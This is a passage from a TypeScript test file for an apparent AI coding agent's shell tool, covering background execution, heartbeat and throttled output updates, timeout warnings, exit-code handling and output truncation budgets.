        `echo $(printf '&')`,
      ],
      [
        'preserves shell wrapper environment and flags during background execution',
        `FOO=bar bash -e -c 'echo "$FOO"; sleep 10'`,
      ],
    ])('%s', async (_title, command) => {
      await runBg(command);
      expectSpawned(command, { background: true });
    });

    it('does not forward the turn signal into the background shell', async () => {
      // Cancelling the turn must not kill an intentionally backgrounded dev
      // server / watcher: the service gets the entry's own controller.
      const turnAc = new AbortController();
      await build('npm run dev', { is_background: true }).execute(
        turnAc.signal,
      );
      const passedSignal = mockShellExecutionService.mock.calls[0][3];
      expect(passedSignal).not.toBe(turnAc.signal);
      turnAc.abort();
      expect(passedSignal.aborted).toBe(false);
    });

    it('should not add ampersand when is_background is false', async () => {
      await runFg('npm test', { pid: 54321 });

      // Foreground commands should not be wrapped with pgrep
      expectSpawned('npm test');
    });

    it('preserves shell wrapper environment and flags during foreground execution', async () => {
      const command = `FOO=bar bash -e -c 'echo "$FOO"; false; echo bad'`;
      await runFg(command);

      expectSpawned(command);
    });

    it('should use the provided directory as cwd', async () => {
      (mockConfig.getWorkspaceContext as Mock).mockReturnValue(
        createMockWorkspaceContext('/test/dir'),
      );
      await runFg('ls', {}, { directory: '/test/dir/subdir' });

      // Foreground commands should not be wrapped with pgrep
      expectSpawned('ls', { cwd: '/test/dir/subdir' });
    });

    it('should not wrap command on windows', async () => {
      vi.mocked(os.platform).mockReturnValue('win32');
      await runFg('dir', { output: '' });
      expectSpawned('dir', { cwd: '/test/dir' });
    });

    it('should format error messages correctly', async () => {
      const error = new Error('wrapped command failed');
      const result = await runFg('user-command', {
        error,
        exitCode: 1,
        output: 'err',
      });
      expectText(
        result.llmContent,
        ['Error: wrapped command failed'],
        ['pgrep'],
      );
    });

    it('should return a SHELL_EXECUTE_ERROR for a command failure', async () => {
      const error = new Error('command failed');
      const result = await runFg('user-command', { error, exitCode: 1 });

      expect(result.error).toBeDefined();
      expect(result.error?.type).toBe(ToolErrorType.SHELL_EXECUTE_ERROR);
      expect(result.error?.message).toBe('command failed');
    });

    it('should throw an error for invalid parameters', async () => {
      expect(() => build('')).toThrow('Command cannot be empty.');
    });

    it('should throw an error for invalid directory', async () => {
      expect(() => build('ls', { directory: 'nonexistent' })).toThrow(
        'Directory must be an absolute path.',
      );
    });

    describe('Silent-command heartbeat', () => {
      let updateOutputMock: Mock;
      beforeEach(() => {
        vi.useFakeTimers({
          toFake: [
            'Date',
            'performance',
            'setTimeout',
            'clearTimeout',
            'setInterval',
            'clearInterval',
          ],
        });
        updateOutputMock = vi.fn();
      });
      afterEach(() => {
        vi.useRealTimers();
      });

      const start = (command: string, params: Partial<ShellToolParams> = {}) =>
        build(command, params).execute(mockAbortSignal, updateOutputMock);

      const heartbeats = () =>
        updateOutputMock.mock.calls
          .map(([arg]) => arg)
          .filter(
            (arg) =>
              typeof arg === 'object' &&
              arg !== null &&
              (arg as { type?: string }).type === 'shell_progress',
          );

      it('emits a heartbeat per silent interval with elapsed and effective timeout', async () => {
        const promise = start('quiet-soak-test');
        // Let execute() reach the post-spawn heartbeat setup.
        await vi.advanceTimersByTimeAsync(0);

        await vi.advanceTimersByTimeAsync(10_000);
        expect(heartbeats()).toHaveLength(1);
        await vi.advanceTimersByTimeAsync(10_000);
        expect(heartbeats()).toHaveLength(2);

        const [first, second] = heartbeats() as Array<Record<string, unknown>>;
        expect(first).toMatchObject({
          type: 'shell_progress',
          elapsedMs: 10_000,
          timeoutMs: 120_000,
        });
        // No output yet → no lastOutputAgeMs, no stats.
        expect(first).not.toHaveProperty('lastOutputAgeMs');
        expect(first).not.toHaveProperty('totalLines');
        expect(first).not.toHaveProperty('totalBytes');
        expect(second['elapsedMs']).toBe(20_000);

        await settle(promise);
      });

      it('stays silent while output keeps the display fresh', async () => {
        const promise = start('npm test');
        await vi.advanceTimersByTimeAsync(0);

        for (let i = 0; i < 4; i++) {
          await vi.advanceTimersByTimeAsync(5_000);
          mockShellOutputCallback({ type: 'data', chunk: `line ${i}` });
        }

        expect(heartbeats()).toHaveLength(0);

        await settle(promise);
      });

      it('reports lastOutputAgeMs once output has been seen', async () => {
        const promise = start('npm test');
        await vi.advanceTimersByTimeAsync(0);

        mockShellOutputCallback({ type: 'data', chunk: 'starting...' });
        await vi.advanceTimersByTimeAsync(20_000);

        const beats = heartbeats() as Array<Record<string, unknown>>;
        expect(beats.length).toBeGreaterThan(0);
        expect(beats.at(-1)!['lastOutputAgeMs']).toBe(20_000);

        await settle(promise);
      });

      it('is disabled by heartbeatIntervalMs: 0', async () => {
        (mockConfig.getShellHeartbeatIntervalMs as Mock).mockReturnValue(0);
        const promise = start('quiet-soak-test');
        await vi.advanceTimersByTimeAsync(30_000);

        expect(heartbeats()).toHaveLength(0);

        await settle(promise);
      });

      it('honours a configured interval', async () => {
        (mockConfig.getShellHeartbeatIntervalMs as Mock).mockReturnValue(5_000);
        const promise = start('quiet-soak-test');
        await vi.advanceTimersByTimeAsync(0);

        await vi.advanceTimersByTimeAsync(5_000);
        expect(heartbeats()).toHaveLength(1);

        await settle(promise);
      });

      it('stops on abort before the process settles', async () => {
        const abortController = new AbortController();
        const promise = build('quiet-soak-test').execute(
          abortController.signal,
          updateOutputMock,
        );
        await vi.advanceTimersByTimeAsync(10_000);
        expect(heartbeats()).toHaveLength(1);

        abortController.abort();
        await vi.advanceTimersByTimeAsync(30_000);
        expect(heartbeats()).toHaveLength(1);

        await settle(promise, { exitCode: null, signal: 15, aborted: true });
      });

      it('stops once the command settles', async () => {
        const promise = start('quiet-soak-test');
        await vi.advanceTimersByTimeAsync(10_000);
        expect(heartbeats()).toHaveLength(1);

        await settle(promise);

        await vi.advanceTimersByTimeAsync(30_000);
        expect(heartbeats()).toHaveLength(1);
      });

      it('carries output stats on the AnsiOutput path', async () => {
        const promise = start('ansi-soak-test');
        await vi.advanceTimersByTimeAsync(0);

        mockShellOutputCallback({ type: 'data', chunk: ansiChunk('hello') });
        await vi.advanceTimersByTimeAsync(20_000);

        const beats = heartbeats() as Array<Record<string, unknown>>;
        expect(beats.length).toBeGreaterThan(0);
        expect(beats.at(-1)).toMatchObject({
          totalLines: 1,
          totalBytes: 5,
        });

        await settle(promise);
      });
    });

    describe('Streaming to `updateOutput`', () => {
      let updateOutputMock: Mock;
      beforeEach(() => {
        vi.useFakeTimers({ toFake: ['Date', 'setTimeout', 'clearTimeout'] });
        updateOutputMock = vi.fn();
      });
      afterEach(() => {
        vi.useRealTimers();
      });

      const start = (command: string, params: Partial<ShellToolParams> = {}) =>
        build(command, params).execute(mockAbortSignal, updateOutputMock);

      /** Starts a 20s-timeout foreground run wired for Ctrl+B promotion. */
      const startPromotable = (
        command: string,
        setPromoteAc: Mock,
        canPromote: () => boolean,
        signal = mockAbortSignal,
      ) =>
        (build(command, { timeout: 20_000 }) as ShellToolInvocation).execute(
          signal,
          updateOutputMock,
          undefined,
          undefined,
          setPromoteAc,
          canPromote,
        );

      /** startPromotable, asserting the promote controller is handed out a tick later. */
      const startArmed = async (
        command: string,
        canPromote: () => boolean = () => true,
      ) => {
        const setPromoteAbortController = vi.fn();
        const promise = startPromotable(
          command,
          setPromoteAbortController,
          canPromote,
        );
        await Promise.resolve();
        expect(setPromoteAbortController).toHaveBeenCalledOnce();
        return { promise };
      };

      /** Asserts the update count and, with `last`, the latest update. */
      const expectUpdates = (times: number, last?: unknown) => {
        expect(updateOutputMock).toHaveBeenCalledTimes(times);
        if (last !== undefined) {
          expect(updateOutputMock).toHaveBeenLastCalledWith(last);
        }
      };

      /** Emits a data chunk. */
      const emit = (chunk: string | AnsiOutput) =>
        mockShellOutputCallback({ type: 'data', chunk });

      it('should immediately show binary detection message and throttle progress', async () => {
        const promise = start('cat img');

        mockShellOutputCallback({ type: 'binary_detected' });
        expect(updateOutputMock).toHaveBeenCalledOnce();
        expect(updateOutputMock).toHaveBeenCalledWith(
          '[Binary output detected. Halting stream...]',
        );

        const progress = (bytesReceived: number) =>
          mockShellOutputCallback({ type: 'binary_progress', bytesReceived });
        progress(1024);
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // Past the throttle interval, a SECOND progress event flushes the latest.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
        progress(2048);
        expectUpdates(2, '[Receiving binary output... 2.0 KB received]');

        await settle(promise);
      });

      it('should throttle live text updates while preserving the latest output', async () => {
        const promise = start('npm test');

        // Leading edge fires immediately; the next chunk is suppressed.
        emit('line 1');
        expect(updateOutputMock).toHaveBeenCalledOnce();
        expect(updateOutputMock).toHaveBeenLastCalledWith('line 1');
        emit('line 2');
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // The trailing flush emits 'line 2'.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
        expectUpdates(2, 'line 2');

        // Past the window again, the next chunk fires immediately.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
        emit('line 3');
        expectUpdates(3, 'line 3');

        await settle(promise, { output: 'line 1\nline 2\nline 3' });
      });

      it('should flush the last suppressed text chunk when the command goes quiet', async () => {
        const promise = start('long-running-cmd');

        // Leading edge, then a chunk suppressed within the throttle window.
        emit('progress: 0%');
        expect(updateOutputMock).toHaveBeenCalledOnce();
        emit('progress: 50%');
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // The trailing flush fires with the latest suppressed chunk.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
        expectUpdates(2, 'progress: 50%');

        await settle(promise, { output: 'progress: 50%' });
      });

      it('should coalesce 3+ rapid text chunks within a window into a single trailing flush', async () => {
        // Regression: after the leading edge, any number of chunks in a window
        // collapse into ONE trailing flush of the latest text; rescheduling per
        // chunk is wasteful and could push the flush past the original window.
        const promise = start('streaming-cmd');

        emit('chunk 1');
        expect(updateOutputMock).toHaveBeenCalledOnce();
        expect(updateOutputMock).toHaveBeenLastCalledWith('chunk 1');

        // Three rapid chunks: none fires synchronously, nor the flush yet.
        await vi.advanceTimersByTimeAsync(50);
        emit('chunk 2');
        await vi.advanceTimersByTimeAsync(50);
        emit('chunk 3');
        await vi.advanceTimersByTimeAsync(50);
        emit('chunk 4');
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // The single trailing flush fires once with the LATEST chunk.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
        expectUpdates(2, 'chunk 4');

        await settle(promise, { output: 'chunk 1chunk 2chunk 3chunk 4' });
      });

      it('should cancel a pending trailing flush when the command completes', async () => {
        // A trailing flush pending at settle MUST be cancelled, or it fires
        // after `execute()` returns: a phantom updateOutput against stale
        // `cumulativeOutput`, racing a consumer that has moved on.
        const promise = start('quick-cmd');

        emit('first');
        expect(updateOutputMock).toHaveBeenCalledOnce();
        emit('second');
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // Resolve BEFORE the throttle window elapses.
        await settle(promise, { output: 'first\nsecond' });

        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 2);
        expect(updateOutputMock).toHaveBeenCalledOnce();
      });

      it('should not fire a duplicate trailing flush after a leading-edge update', async () => {
        // `doUpdate()` is the single point cancelling a pending trailing flush,
        // so a leading-edge update never lets a duplicate escape. End-to-end:
        // suppress → flush → leading edge → suppress → flush, no duplicates.
        const promise = start('multi-window-cmd');

        // Window 1: leading-edge 'a', then 'b' suppressed and flushed.
        emit('a');
        expectUpdates(1, 'a');
        await vi.advanceTimersByTimeAsync(100);
        emit('b');
        expect(updateOutputMock).toHaveBeenCalledTimes(1);
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS);
        expectUpdates(2, 'b');

        // Window 2: 'c' takes the leading edge; a failure to cancel a future
        // timer would show up as duplicates below.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
        emit('c');
        expectUpdates(3, 'c');
        await vi.advanceTimersByTimeAsync(50);
        emit('d');
        expect(updateOutputMock).toHaveBeenCalledTimes(3);
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS);
        expectUpdates(4, 'd');

        // A long quiet period: no late updates from zombie timers.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 5);
        expect(updateOutputMock).toHaveBeenCalledTimes(4);

        await settle(promise, { output: 'abcd' });
      });

      it('should cancel a pending trailing flush when the abort signal fires', async () => {
        // A cancel (or timeout) with a flush pending must cancel the timer,
        // or a stale frame flashes before the result settles `aborted: true`.
        const ac = new AbortController();
        const promise = build('sleep 1').execute(ac.signal, updateOutputMock);

        emit('partial');
        expect(updateOutputMock).toHaveBeenCalledOnce();
        emit('more partial');
        expect(updateOutputMock).toHaveBeenCalledOnce();

        // Abort cancels the timer synchronously.
        ac.abort();
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 2);
        expect(updateOutputMock).toHaveBeenCalledOnce();

        await settle(promise, {
          output: 'partial',
          exitCode: null,
          signal: 15,
          aborted: true,
        });

        // Even after settle + further time, no late update.
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS * 2);
        expect(updateOutputMock).toHaveBeenCalledOnce();
      });

      it('should warn shortly before a foreground command times out', async () => {
        const { promise } = await startArmed('slow-build');

        await vi.advanceTimersByTimeAsync(4_999);
        expect(updateOutputMock).not.toHaveBeenCalled();

        await vi.advanceTimersByTimeAsync(1);
        expect(updateOutputMock).toHaveBeenCalledOnce();
        for (const text of ['about to time out', 'Ctrl+B']) {
          expect(updateOutputMock).toHaveBeenLastCalledWith(
            expect.stringContaining(text),
          );
        }

        emit('still running');
        await vi.advanceTimersByTimeAsync(OUTPUT_UPDATE_INTERVAL_MS + 1);
        expect(updateOutputMock).toHaveBeenCalledTimes(2);
        for (const text of ['still running', 'Ctrl+B']) {
          expect(updateOutputMock).toHaveBeenLastCalledWith(
            expect.stringContaining(text),
          );
        }

        await settle(promise, { output: 'still running' });
      });

      it('should append the foreground timeout warning to ANSI output', async () => {
        const { promise } = await startArmed('ansi-slow-build');

        emit(ansiChunk('still running'));
        expect(updateOutputMock).toHaveBeenCalledOnce();

        await vi.advanceTimersByTimeAsync(5_000);

        expect(updateOutputMock).toHaveBeenCalledTimes(2);
        const warningFrame = updateOutputMock.mock.calls.at(-1)?.[0] as {
          ansiOutput: AnsiOutput;
        };
        expect(warningFrame.ansiOutput.at(-1)?.[0]).toMatchObject({
          text: expect.stringContaining('about to time out'),
          bold: true,
          fg: '#ff5555',
        });

        await settle(promise, { output: 'still running' });
      });

      it('should not show the Ctrl+B warning when promotion is ambiguous', async () => {
        const { promise } = await startArmed(
          'ambiguous-slow-build',
          () => false,
        );

        await vi.advanceTimersByTimeAsync(5_000);
        expect(updateOutputMock).not.toHaveBeenCalled();

        await settle(promise, { output: 'done' });
      });

      it('should suppress a stale Ctrl+B warning if promotion becomes ambiguous before the timer fires', async () => {
        let canPromote = true;
        const { promise } = await startArmed(
          'stale-warning-slow-build',
          () => canPromote,
        );

        await vi.advanceTimersByTimeAsync(4_999);
        canPromote = false;
        await vi.advanceTimersByTimeAsync(1);
        expect(updateOutputMock).not.toHaveBeenCalled();

        await settle(promise, { output: 'done' });
      });

      it('schedules the warning against the real timeout clock', async () => {
        mockShellExecutionService.mockImplementationOnce(
          (_cmd, _cwd, callback) => {
            mockShellOutputCallback = callback;
            vi.advanceTimersByTime(6_000);
            return {
              pid: 12345,
              result: new Promise((resolve) => {
                resolveExecutionPromise = resolve;
              }),
            };
          },
        );
        const { promise } = await startArmed('slow-spawn');

        await vi.advanceTimersByTimeAsync(0);
        expect(updateOutputMock).toHaveBeenCalledOnce();
        expect(updateOutputMock).toHaveBeenLastCalledWith(
          expect.stringContaining('about to time out'),
        );

        await settle(promise, { output: 'done' });
      });

      it('should not show the Ctrl+B warning outside interactive mode', async () => {
        (mockConfig.isInteractive as Mock).mockReturnValue(false);
        const promise = startPromotable('headless-build', vi.fn(), () => true);
        await Promise.resolve();

        await vi.advanceTimersByTimeAsync(5_000);
        expect(updateOutputMock).not.toHaveBeenCalled();

        await settle(promise, { output: 'done' });
      });

      it('should not show the Ctrl+B warning when no promote callback is wired', async () => {
        const promise = start('direct-core-build', { timeout: 20_000 });
        await Promise.resolve();

        await vi.advanceTimersByTimeAsync(5_000);
        expect(updateOutputMock).not.toHaveBeenCalled();

        await settle(promise, { output: 'done' });
      });

      it('should cancel the near-timeout warning when the command completes early', async () => {
        const promise = startPromotable('quick-cmd', vi.fn(), () => true);
        await Promise.resolve();

        await vi.advanceTimersByTimeAsync(1_000);
        await settle(promise, { output: 'done' });

        await vi.advanceTimersByTimeAsync(10_000);
        expect(updateOutputMock).not.toHaveBeenCalled();
      });

      it('should not arm the near-timeout warning after an abort that happens before the shell handle is ready', async () => {
        const ac = new AbortController();
        const setPromoteAbortController = vi.fn();
        let resolveShellHandle: (handle: {
          pid: number;
          result: Promise<ShellExecutionResult>;
        }) => void;
        mockShellExecutionService.mockImplementationOnce(
          (_cmd, _cwd, callback) => {
            mockShellOutputCallback = callback;
            return new Promise((resolve) => {
              resolveShellHandle = resolve;
            });
          },
        );
        const promise = startPromotable(
          'slow-spawn',
          setPromoteAbortController,
          () => true,
          ac.signal,
        );

        ac.abort();
        resolveShellHandle!({
          pid: 12345,
          result: new Promise((resolve) => {
            resolveExecutionPromise = resolve;
          }),
        });
        await Promise.resolve();
        await Promise.resolve();
        expect(setPromoteAbortController).toHaveBeenCalledOnce();

        await vi.advanceTimersByTimeAsync(5_000);
        expect(updateOutputMock).not.toHaveBeenCalled();

        await settle(promise, {
          output: 'partial',
          exitCode: null,
          signal: 15,
          aborted: true,
        });
      });

      it('should clean up a pending trailing flush if execute() rejects', async () => {
        // The service can throw before resolving (e.g. PTY dynamic import
        // failure): the error propagates and no timer survives to fire a late
        // update (no chunk or near-timeout warning can precede the handle).
        const ac = new AbortController();
        mockShellExecutionService.mockImplementationOnce(() => {
          throw new Error('pty-import-failed');
        });

        await expect(
          build('pty-cmd', { timeout: 20_000 }).execute(
            ac.signal,
            updateOutputMock,
          ),
        ).rejects.toThrow('pty-import-failed');

        // Aborting afterwards must not crash or update (no listener leak).
        ac.abort();
        await vi.advanceTimersByTimeAsync(5_000);
        expect(updateOutputMock).not.toHaveBeenCalled();
      });

      it('should pass ANSI chunks through immediately without throttling', async () => {
        const promise = start('interactive-cmd');

        // Both ANSI chunks fire updateOutput immediately, back-to-back.
        emit(ansiChunk('Hello'));
        emit(ansiChunk('World'));

        expect(updateOutputMock).toHaveBeenCalledTimes(2);

        await settle(promise);
      });
    });

    it.each([0, 1])(
      'omits repeated command source from nested shell results (exit %i)',
      async (exitCode) => {
        const command = 'echo ' + 'large-script-source'.repeat(3000);
        const invocation = build(command);
        const promise = runWithToolCallSource({ kind: 'code_mode' }, () =>
          invocation.execute(mockAbortSignal),
        );
        resolveShellExecution({
          output: 'diagnostic output',
          exitCode,
          error: null,
        });
        const result = await promise;
        expectText(
          result.llmContent,
          ['diagnostic output', `Exit Code: ${exitCode}`],
          ['large-script-source'],
        );
        expect(String(result.llmContent).length).toBeLessThan(1000);
        if (exitCode !== 0) {
          expectText(
            result.error?.message,
            ['diagnostic output'],
            ['large-script-source'],
          );
        }
      },
    );

    it.each(['failed output', ''])(
      'reports a foreground non-zero exit with output %j as a tool error',
      async (output) => {
        const result = await runFg('failing-command', { output, exitCode: 3 });

        expect(shellResultText(result.returnDisplay)).toBe(
          output || 'Command exited with code: 3',
        );
        expect(result.error).toEqual({
          message: expect.stringContaining('Exit Code: 3'),
          type: ToolErrorType.SHELL_EXECUTE_ERROR,
        });
        expect(result.error?.message).toContain(output || 'Output: (empty)');
        expect(result.returnDisplay).toMatchObject({
          type: 'shell_result',
          version: 1,
          outcome: 'failed',
          output,
          exitCode: 3,
        });
      },
    );

    /** A foreground run killed by SIGTERM (numeric code 15), not by us. */
    const SIGTERMED = { output: '', exitCode: null, signal: 15 };
    /** The tool error a signal-terminated foreground run reports. */
    const SIGNAL_15_ERROR = {
      message: expect.stringContaining('Signal: 15'),
      type: ToolErrorType.SHELL_EXECUTE_ERROR,
    };

    it('reports a foreground signal termination as a tool error', async () => {
      const result = await runFg('signal-terminated-command', SIGTERMED);

      expect(result.error).toEqual(SIGNAL_15_ERROR);
      expect(shellResultText(result.returnDisplay)).toBe(
        'Command terminated by signal: 15',
      );
    });

    it('keeps a successful PTY exit code successful with signal 0 metadata', async () => {
      const result = await runFg('pty-cleanup-command', {
        output: 'completed',
        exitCode: 0,
        signal: 0,
      });

      expect(result.error).toBeUndefined();
      expect(result.llmContent).toContain('Output: completed');
      expect(result.returnDisplay).toEqual({
        type: 'shell_result',
        version: 1,
        text: 'completed',
        output: 'completed',
        directory: '/test/dir',
        exitCode: 0,
        signal: 0,
        pid: 12345,
        error: null,
        outcome: 'completed',
        notices: [],
        truncated: false,
        outputFiles: [],
      });
    });

    it('reports a PTY signal termination as a tool error', async () => {
      const result = await runFg('pty-signal-terminated-command', {
        output: '',
        exitCode: 0,
        signal: 15,
      });

      expect(result.error).toEqual(SIGNAL_15_ERROR);
    });

    it('does not report a user-cancelled signal as a tool error', async () => {
      const result = await runFg('cancelled-command', {
        ...SIGTERMED,
        aborted: true,
      });

      expect(result.error).toBeUndefined();
      expect(result.llmContent).toContain('Command was cancelled');
      expect(result.returnDisplay).toMatchObject({
        outcome: 'cancelled',
        output: '',
        signal: 15,
      });
    });

    it.each([
      'grep pattern file',
      'rg pattern file',
      'diff before after',
      'test -f missing',
      '[ -f missing ]',
      '[[ -f missing ]]',
      '"C:\\\\tools\\\\grep.exe" pattern file',
    ])('does not report exit 1 from %s as a tool error', async (command) => {
      const result = await runFg(command, {
        output: 'negative result',
        exitCode: 1,
      });

      expect(result.error).toBeUndefined();
      expect(result.llmContent).toContain('Exit Code: 1');
      expect(result.returnDisplay).toMatchObject({
        outcome: 'completed',
        exitCode: 1,
        error: null,
      });
    });

    it('does not report exit 1 from a pipeline ending in grep as a tool error', async () => {
      const result = await runFg('ps aux | grep missing-process', {
        output: '',
        exitCode: 1,
      });

      expect(result.error).toBeUndefined();
      expect(result.llmContent).toContain('Exit Code: 1');
    });

    it.each([
      [
        'reports exit 1 from find as a tool error',
        'find missing-directory',
        'find: missing-directory: No such file or directory',
        1,
      ],
      [
        'does not exempt exit 1 from a mixed compound command',
        'false && ps aux | grep pattern',
        '',
        1,
      ],
      [
        'reports exit 2 from an allowlisted command as a tool error',
        'grep pattern file',
        'grep failed',
        2,
      ],
    ])('%s', async (_title, command, output, exitCode) => {
      const result = await runFg(command, { output, exitCode });

      expect(result.error?.type).toBe(ToolErrorType.SHELL_EXECUTE_ERROR);
    });

    describe('output truncation threshold', () => {
      const TRUNCATED = 'Tool output was too large and has been truncated';
      const ADVISORY = 'this foreground command ran for 60s';

      /** Runs `mid-output-cmd` to `output`/`exitCode` after 60s of faked Date/performance (so the advisory appends). */
      const runPastAdvisory = (output: string, exitCode = 0) => {
        fakeTimers({ toFake: ['Date', 'performance'] });
        return runFg(
          'mid-output-cmd',
          { output, exitCode },
          { advanceMs: 60_000 },
        );
      };

      it('keeps the 30k Shell default when no threshold is configured', () => {
        expect(shellTool.maxOutputChars).toBe(30_000);
      });

      it.each([25_000, 10_000, 100_000, Number.POSITIVE_INFINITY])(
        'exposes the explicit threshold %s to the scheduler',
        (threshold) => {
          setExplicitThreshold(threshold);

          expect(shellTool.maxOutputChars).toBe(threshold);
        },
      );

      it('passes the 30k Shell default to output truncation', async () => {
        const spy = await spyTruncation();

        await runFg('large-output-cmd', { output: 'x'.repeat(35_000) });

        expect(spy).toHaveBeenCalledWith(
          mockConfig,
          ShellTool.Name,
          expect.any(String),
          expect.objectContaining({ threshold: 30_000 }),
        );
      });

      it('keeps 40k model-facing output when the explicit threshold is 100k', async () => {
        setExplicitThreshold(100_000);
        const output = 'x'.repeat(40_000);
        const result = await runFg('large-output-cmd', { output, exitCode: 0 });

        expectText(result.llmContent, [output], [TRUNCATED]);
        expect(result.persistedOutputFiles).toBeUndefined();
      });

      it('does not persist a raw capture preview as full output', async () => {
        const truncationModule = await import('./truncation.js');
        const spy = vi
          .spyOn(truncationModule, 'truncateToolOutput')
          .mockResolvedValue({
            content: 'Full output saved to /tmp/preview.output; use read_file.',
            outputFile: '/tmp/preview.output',
          });
        const capture: ShellRawCaptureSink = {
          write: vi.fn().mockResolvedValue(undefined),
          finish: vi.fn().mockResolvedValue(undefined),
          setStarted: vi.fn(),
          setProcessResult: vi.fn(),
        };
        const output = 'x'.repeat(64 * 1024);
        try {
          const invocation = shellTool.build({
            command: 'large-output-cmd',
            is_background: false,
          }) as ShellToolInvocation;
          const pending = invocation.execute(
            mockAbortSignal,
            undefined,
            undefined,
            undefined,
            undefined,
            undefined,
            capture,
          );
          resolveShellExecution({ output, exitCode: 0 });
          const result = await pending;

          expect(spy).not.toHaveBeenCalled();
          expect(result.llmContent).toContain(output);
          expect(result.llmContent).not.toContain('/tmp/preview.output');
          expect(result.llmContent).not.toContain('read_file');
          expect(result.persistedOutputFiles).toBeUndefined();
          expect(result.returnDisplay).toMatchObject({ outputFiles: [] });
          expect(mockShellExecutionService.mock.calls[0][5]).toMatchObject({
            maxBufferedOutputBytes: 64 * 1024,
          });
          expect(capture.setProcessResult).toHaveBeenCalledWith(
            expect.objectContaining({ output, exitCode: 0 }),
          );
        } finally {
          spy.mockRestore();
        }
      });

      it('passes an explicit low threshold to output truncation', async () => {
        setExplicitThreshold(10_000);
        const outputFile = '/tmp/qwen-temp/shell-output.txt';
        const truncatedContent =
          'Tool output was too large and has been truncated.';
        const spy = await spyTruncation({
          content: truncatedContent,
          outputFile,
        });

        const result = await runFg('large-output-cmd', {
          output: 'x'.repeat(15_000),
        });

        expect(spy).toHaveBeenCalledWith(
          mockConfig,
          ShellTool.Name,
          expect.any(String),
          expect.objectContaining({
            threshold: 10_000,
            previewChars: 4000,
            lines: Number.POSITIVE_INFINITY,
          }),
        );
        expect(result.llmContent).toContain(truncatedContent);
        expect(result.persistedOutputFiles).toEqual([outputFile]);
        expect(result.returnDisplay).toMatchObject({
          outputFiles: [outputFile],
        });
      });

      it('limits the preview budget to an explicit threshold below 4k', async () => {
        setExplicitThreshold(1000);
        const spy = await spyTruncation();

        await runFg('large-output-cmd', { output: 'x'.repeat(5000) });

        expect(spy).toHaveBeenCalledWith(
          mockConfig,
          ShellTool.Name,
          expect.any(String),
          expect.objectContaining({ threshold: 1000, previewChars: 1000 }),
        );
      });

      describe('outputBudgetApplied', () => {
        // The scheduler's generic spill gate sits at the GLOBAL threshold (25k
        // default) + 3k headroom ≈ 28k, below Shell's 30k budget. Output in
        // that window needs the marker even when nothing was cut, or the gate
        // re-bounds it head-only and the preview collapses to a short head.
        it('marks a body that fits the threshold, leaving it untouched', async () => {
          const output = 'x'.repeat(29_000);
          const result = await runFg('mid-output-cmd', { output, exitCode: 0 });

          expect(result.outputBudgetApplied).toBe(true);
          expect(result.llmContent).toContain(output);
          expect(result.persistedOutputFiles).toBeUndefined();
        });

        it('marks a body that exceeded the threshold', async () => {
          const result = await runFg('large-output-cmd', {
            output: 'x'.repeat(35_000),
            exitCode: 0,
          });

          expect(result.outputBudgetApplied).toBe(true);
        });

        // The scheduler skips its error gate only when `error.message` is still
        // byte-for-byte the marked body, so this identity is load-bearing.
        it('marks a non-zero exit and reports the same text as error.message', async () => {
          const result = await runFg('failing-cmd', {
            output: 'y'.repeat(29_000),
            exitCode: 1,
          });

          expect(result.outputBudgetApplied).toBe(true);
          expect(result.error?.message).toBe(result.llmContent);
        });

        it('leaves an explicit background launch unmarked', async () => {
          const result = await runBg('sleep 100');

          // Assert the receipt first: `toBeUndefined` alone would also pass
          // for a result that never reached this path.
          expect(result.llmContent).toContain('Background shell started.');
          expect(result.outputBudgetApplied).toBeUndefined();
        });

        it('marks a timed-out foreground body carrying the partial output', async () => {
          // The scheduler's timeout branch stands its gate down for a marked
          // body, so the marker alone decides whether a ~29k timed-out body
          // reaches the model whole.
          const partial = 'x'.repeat(29_000);
          stubAbortSignal(timedOutSignal());

          const result = await runFg(
            'long-running-command',
            { output: partial, exitCode: null, aborted: true },
            { timeout: 5000 },
          );

          expect(result.error?.type).toBe(ToolErrorType.EXECUTION_TIMEOUT);
          expect(result.outputBudgetApplied).toBe(true);
          expect(result.llmContent).toContain(partial);
          // The timeout error.message is deliberately the short summary alone,
          // so the marker is the only bound signal on this path.
          expect(result.error?.message).not.toBe(result.llmContent);
        });

        it('reserves the appended advisory out of the body budget', async () => {
          // The long-run advisory is appended AFTER in-tool sizing, so it comes
          // out of the body budget; otherwise the per-tool pass re-bounds the
          // assembled string under a second policy. The ~100-char header puts
          // 29_700 in the (budget - advisory, budget] band sized as over-budget.
          const output = 'x'.repeat(29_700);
          const result = await runPastAdvisory(output);

          expect(result.outputBudgetApplied).toBe(true);
          // Without the reservation the body would fit whole and the advisory
          // would push the assembled string past the budget.
          expectText(result.llmContent, [ADVISORY], [output]);
          expect(String(result.llmContent).length).toBeLessThanOrEqual(30_000);
        });

        it('reserves the appended attribution warning out of the body budget', async () => {
          // The attribution warning is the other appended half: a commit body
          // that fits 30k alone but not with the warning must be sized as
          // over-budget, or the assembled string exceeds what the marker
          // vouches for. The ~121-char header puts 29,850 in that band.
          const longMessage = `notes exploded: ${'x'.repeat(300)}`;
          const output = 'x'.repeat(29_850);
          const result = await commitWithNoteFailure(longMessage, output);

          expect(result.outputBudgetApplied).toBe(true);
          expect(result.llmContent).toContain(
            `AI attribution note skipped: ${longMessage.slice(0, 120)}.`,
          );
          // Sized as over-budget: raw output gone, sentinel present, and body +
          // warning still fits the declared budget.
